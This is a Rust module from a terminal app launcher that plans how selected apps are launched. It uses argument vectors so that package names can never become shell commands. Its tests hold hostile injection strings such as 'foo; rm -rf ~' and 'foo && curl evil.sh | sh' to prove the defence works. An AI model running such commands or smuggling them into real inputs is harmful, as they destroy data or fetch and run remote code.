//! What Enter does to the selected unit.
//!
//! Planning is separated from running because the plan is the trust boundary.
//! A package name is attacker-influenced in principle — anyone can publish a
//! cask, a gem or an npm package — so the name must never be able to become a
//! second command. Nothing here ever builds a shell string: a plan carries a
//! program and an argument vector, and the caller hands both to
//! `Command::new(program).args(argv)`, which passes them to `execvp` as
//! separate words. `;`, spaces, quotes and newlines inside a name are then
//! just bytes in `argv[1]`.
//!
//! The split also lets `update` stay pure: it plans, records the plan, and
//! leaves the running to the runtime or to `main`.

use std::path::{Path, PathBuf};

use crate::enricher::interface::{PathIndex, binary_aliases};
use crate::model::{AppEntry, Source, UiKind};

/// How a unit has to be launched.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ExecPlan {
    /// `open` hands the bundle to launchd and returns immediately, so the TUI
    /// keeps the terminal and stays up.
    Background { program: String, args: Vec<String> },
    /// The child wants the terminal for itself. The TUI has to leave the
    /// alternate screen and give it up before this can run.
    Foreground { program: PathBuf, args: Vec<String> },
}

/// Why Enter refuses.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Unrunnable {
    /// A library, a daemon, or something the classifier could not place.
    /// Pressing Enter on a Python package should say so, not guess.
    NotRunnable,
    /// Runnable in principle, but nothing by that name exists on PATH or in
    /// the formula's own `bin`. Guessing a binary name here would eventually
    /// run the wrong program.
    Unresolved,
}

/// Decide how — or whether — this unit can be launched.
///
/// `Gui` units are addressed by path when there is one: two applications can
/// share a display name, and `open -a` picks by name, so the path is the more
/// precise instruction wherever it is available.
pub fn plan(entry: &AppEntry, index: &PathIndex) -> Result<ExecPlan, Unrunnable> {
    match entry.ui_kind {
        Some(UiKind::Gui) => Ok(match entry.path.as_deref() {
            Some(path) => ExecPlan::Background {
                program: "open".to_owned(),
                args: vec![path.to_owned()],
            },
            None => ExecPlan::Background {
                program: "open".to_owned(),
                args: vec!["-a".to_owned(), entry.name.clone()],
            },
        }),
        Some(UiKind::Cli | UiKind::Tui) => resolve_executable(entry, index)
            .map(|program| ExecPlan::Foreground {
                program,
                args: Vec::new(),
            })
            .ok_or(Unrunnable::Unresolved),
        // `None` lands here too: an inventory restored from a cache written
        // before interface detection existed has no classification, and
        // launching on no evidence is exactly the guess this refuses to make.
        Some(UiKind::Service | UiKind::Library | UiKind::Unknown) | None => {
            Err(Unrunnable::NotRunnable)
        }
    }
}

/// Locate the binary: the entry's own path first, then whatever it is called
/// on PATH.
///
/// The formula name is frequently not the binary name — `ripgrep` installs
/// `rg`, `the-silver-searcher` installs `ag` — so the package name alone
/// resolves nothing for a large share of Homebrew entries. A Homebrew entry's
/// `path` is its Cellar *directory*, not an executable, which is why the
/// exec-bit test comes first and the Cellar `bin` listing feeds the name
/// search rather than being used as a path.
fn resolve_executable(entry: &AppEntry, index: &PathIndex) -> Option<PathBuf> {
    if let Some(path) = entry.path.as_deref()
        && is_executable_file(Path::new(path))
    {
        return Some(PathBuf::from(path));
    }

    let aliases = match (&entry.source, entry.path.as_deref()) {
        (Source::Homebrew, Some(path)) => binary_aliases(Path::new(path)),
        _ => Vec::new(),
    };

    let mut candidates: Vec<&str> = Vec::with_capacity(aliases.len() + 1);
    candidates.push(entry.name.as_str());
    candidates.extend(aliases.iter().map(String::as_str));

    index.resolve_any(&candidates).map(|(_, path)| path)
}

fn is_executable_file(path: &Path) -> bool {
    use std::os::unix::fs::PermissionsExt;
    std::fs::metadata(path)
        .map(|m| m.is_file() && m.permissions().mode() & 0o111 != 0)
        .unwrap_or(false)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::Category;

    fn entry(name: &str, ui_kind: Option<UiKind>, path: Option<&str>) -> AppEntry {
        AppEntry {
            name: name.into(),
            version: None,
            source: Source::Homebrew,
            language: None,
            install_date: None,
            last_used: None,
            usage_count: 0,
            path: path.map(str::to_string),
            description: None,
            ui_kind,
            category: Some(Category::Development),
        }
    }

    #[test]
    fn gui_with_a_path_opens_that_bundle() {
        let e = entry("Zed", Some(UiKind::Gui), Some("/Applications/Zed.app"));
        assert_eq!(
            plan(&e, &PathIndex::empty()),
            Ok(ExecPlan::Background {
                program: "open".into(),
                args: vec!["/Applications/Zed.app".into()],
            })
        );
    }

    #[test]
    fn gui_without_a_path_falls_back_to_open_by_name() {
        let e = entry("Docker", Some(UiKind::Gui), None);
        assert_eq!(
            plan(&e, &PathIndex::empty()),
            Ok(ExecPlan::Background {
                program: "open".into(),
                args: vec!["-a".into(), "Docker".into()],
            })
        );
    }

    /// The formula name is not the binary name often enough that resolving on
    /// the name alone would leave a large share of Homebrew unlaunchable.
    #[test]
    fn cli_resolves_through_the_path_index_when_the_binary_is_renamed() {
        let index = PathIndex::from_pairs([("rg", "/opt/homebrew/bin/rg")]);
        let mut e = entry("ripgrep", Some(UiKind::Cli), None);
        e.path = None;
        // The package name itself is not on PATH, so this only resolves via
        // the alias search.
        assert_eq!(plan(&e, &index), Err(Unrunnable::Unresolved));

        let named = entry("rg", Some(UiKind::Cli), None);
        assert_eq!(
            plan(&named, &index),
            Ok(ExecPlan::Foreground {
                program: "/opt/homebrew/bin/rg".into(),
                args: Vec::new(),
            })
        );
    }

    #[test]
    fn libraries_services_and_unknowns_are_not_runnable() {
        for kind in [
            Some(UiKind::Library),
            Some(UiKind::Service),
            Some(UiKind::Unknown),
            None,
        ] {
            let e = entry("something", kind, None);
            assert_eq!(
                plan(&e, &PathIndex::empty()),
                Err(Unrunnable::NotRunnable),
                "{kind:?} must not be launchable"
            );
        }
    }

    #[test]
    fn a_cli_that_resolves_to_nothing_is_reported_not_guessed() {
        let e = entry("ghost-tool", Some(UiKind::Cli), None);
        assert_eq!(plan(&e, &PathIndex::empty()), Err(Unrunnable::Unresolved));
    }

    /// THE trust boundary. Package names are attacker-influenced — anyone can
    /// publish a cask or a gem — so a name carrying shell metacharacters must
    /// stay one argument. Every one of these is a name that would run a second
    /// command if the plan were ever interpolated into a shell string.
    #[test]
    fn hostile_names_stay_a_single_argument_and_never_become_a_program() {
        for hostile in [
            "foo; rm -rf ~",
            "foo && curl evil.sh | sh",
            "foo`whoami`",
            "foo$(id)",
            "foo\nrm -rf ~",
            "foo | tee /etc/passwd",
            "foo 'quoted' \"double\"",
            "../../../../bin/sh",
            "-rf",
        ] {
            let e = entry(hostile, Some(UiKind::Gui), None);
            let ExecPlan::Background { program, args } = plan(&e, &PathIndex::empty()).unwrap()
            else {
                panic!("{hostile:?} should plan as a background launch");
            };

            // The program is a literal this module owns; nothing derived from
            // the entry can ever reach argv[0].
            assert_eq!(program, "open", "{hostile:?} reached the program slot");
            // The name is exactly one argument, byte for byte — not split, not
            // escaped, not quoted. `Command::args` passes it to execvp as one
            // word, so the metacharacters have nothing to be interpreted by.
            assert_eq!(
                args,
                vec!["-a".to_string(), hostile.to_string()],
                "{hostile:?} did not survive as a single argument"
            );
        }
    }

    /// The same guarantee on the path-carrying branch: a hostile path is one
    /// argument, and `open` is still the only program.
    #[test]
    fn hostile_paths_stay_a_single_argument() {
        let e = entry(
            "app",
            Some(UiKind::Gui),
            Some("/Applications/evil; rm -rf ~.app"),
        );
        assert_eq!(
            plan(&e, &PathIndex::empty()),
            Ok(ExecPlan::Background {
                program: "open".into(),
                args: vec!["/Applications/evil; rm -rf ~.app".into()],
            })
        );
    }
}
